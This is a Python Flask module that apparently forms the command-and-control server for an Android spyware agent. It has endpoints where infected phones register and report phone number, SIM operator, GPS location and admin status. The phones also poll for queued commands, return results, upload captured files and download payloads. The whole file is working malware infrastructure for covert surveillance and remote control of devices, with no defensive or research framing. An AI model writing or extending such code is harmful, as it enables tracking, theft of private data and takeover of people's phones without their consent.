"""Endpoints consumed by the Android agent."""

import json
import os
import uuid
from datetime import datetime
from flask import Blueprint, request, jsonify, send_file

from database import db
from models import Device, Command, CapturedFile, LogEntry
from config import Config
from c2.command_builder import COMMAND_CATALOG
from c2.file_handler import persist_upload
from c2.ws_dashboard import broadcast

agent_api = Blueprint("agent_api", __name__, url_prefix="/api/agent")


def _auth():
    return request.headers.get("X-Api-Key", "") == Config.API_KEY


def _get_device(device_id):
    return Device.query.filter_by(device_id=device_id).first()


@agent_api.route("/register", methods=["POST"])
def register():
    if not _auth():
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(force=True)
    device_id = data.get("device_id") or str(uuid.uuid4())

    dev = _get_device(device_id)
    if not dev:
        dev = Device(device_id=device_id)
        db.session.add(dev)

    dev.model = data.get("model", dev.model)
    dev.manufacturer = data.get("manufacturer", dev.manufacturer)
    dev.android_version = data.get("android_version", dev.android_version)
    dev.sdk_int = data.get("sdk_int", dev.sdk_int)
    dev.hostname = data.get("hostname", dev.hostname)
    dev.ip_address = request.remote_addr
    dev.battery = data.get("battery", dev.battery)
    dev.is_charging = bool(data.get("is_charging", dev.is_charging))
    dev.screen_on = bool(data.get("screen_on", dev.screen_on))
    dev.is_admin = bool(data.get("is_admin", dev.is_admin))
    dev.sim_operator = data.get("sim_operator", dev.sim_operator)
    dev.phone_number = data.get("phone_number", dev.phone_number)
    dev.last_seen = datetime.utcnow()
    dev.is_online = True

    if data.get("latitude") and data.get("longitude"):
        dev.latitude = data["latitude"]
        dev.longitude = data["longitude"]
        dev.country = data.get("country", dev.country)
        dev.city = data.get("city", dev.city)

    db.session.commit()
    broadcast("device_update", dev.to_dict())
    return jsonify({"ok": True, "device_id": device_id})


@agent_api.route("/poll", methods=["POST"])
def poll():
    if not _auth():
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(force=True)
    dev = _get_device(data.get("device_id"))
    if not dev:
        return jsonify({"error": "unknown_device"}), 404

    dev.last_seen = datetime.utcnow()
    dev.is_online = True
    dev.battery = data.get("battery", dev.battery)
    dev.is_charging = bool(data.get("is_charging", dev.is_charging))
    dev.screen_on = bool(data.get("screen_on", dev.screen_on))
    if data.get("latitude") and data.get("longitude"):
        dev.latitude = data["latitude"]
        dev.longitude = data["longitude"]
    db.session.commit()

    pending = Command.query.filter_by(device_id=dev.id, status="pending").limit(20).all()
    for c in pending:
        c.status = "sent"
        c.delivered_at = datetime.utcnow()
    db.session.commit()

    broadcast("device_update", dev.to_dict())

    return jsonify({
        "commands": [
            {"id": c.id, "type": c.command_type, "args": c.args()}
            for c in pending
        ]
    })


@agent_api.route("/result", methods=["POST"])
def result():
    if not _auth():
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(force=True)
    cmd = Command.query.get(data.get("command_id"))
    if not cmd:
        return jsonify({"error": "unknown_command"}), 404

    cmd.result = json.dumps(data.get("result", {}))[:1024 * 512]
    cmd.status = "done" if data.get("success") else "failed"
    cmd.completed_at = datetime.utcnow()
    db.session.commit()

    broadcast("command_result", cmd.to_dict())
    return jsonify({"ok": True})


@agent_api.route("/upload", methods=["POST"])
def upload():
    if not _auth():
        return jsonify({"error": "unauthorized"}), 401

    device_id = request.form.get("device_id")
    category = request.form.get("category", "misc")
    command_id_raw = request.form.get("command_id")
    command_id = int(command_id_raw) if command_id_raw and command_id_raw.isdigit() else None
    file = request.files.get("file")
    if not file or not device_id:
        return jsonify({"error": "bad_request"}), 400

    dev = _get_device(device_id)
    if not dev:
        return jsonify({"error": "unknown_device"}), 404

    cf = persist_upload(
        device=dev,
        file_stream=file.stream,
        filename=file.filename,
        category=category,
        command_id=command_id,
        mime_hint=file.mimetype,
        metadata={
            "remote_ip": request.remote_addr,
            "user_agent": request.headers.get("User-Agent", ""),
        },
    )

    broadcast("new_file", cf.to_dict(), room="all_devices")
    broadcast("new_file", cf.to_dict(), room=f"device_{dev.id}")

    return jsonify({"ok": True, "file_id": cf.id, "url": f"/api/file/{cf.id}/raw"})


@agent_api.route("/log", methods=["POST"])
def log():
    if not _auth():
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(force=True)
    dev = _get_device(data.get("device_id"))
    entry = LogEntry(
        device_id=dev.id if dev else None,
        level=data.get("level", "info"),
        message=data.get("message", ""),
    )
    db.session.add(entry)
    db.session.commit()

    broadcast("log", entry.to_dict())
    return jsonify({"ok": True})


@agent_api.route("/download/<path:filename>", methods=["GET"])
def download(filename):
    if not _auth():
        return jsonify({"error": "unauthorized"}), 401
    base = os.path.join(Config.UPLOAD_FOLDER, "to_agent")
    safe = os.path.normpath(os.path.join(base, filename))
    if not safe.startswith(base):
        return jsonify({"error": "forbidden"}), 403
    if not os.path.exists(safe):
        return jsonify({"error": "not_found"}), 404
    return send_file(safe, as_attachment=True)
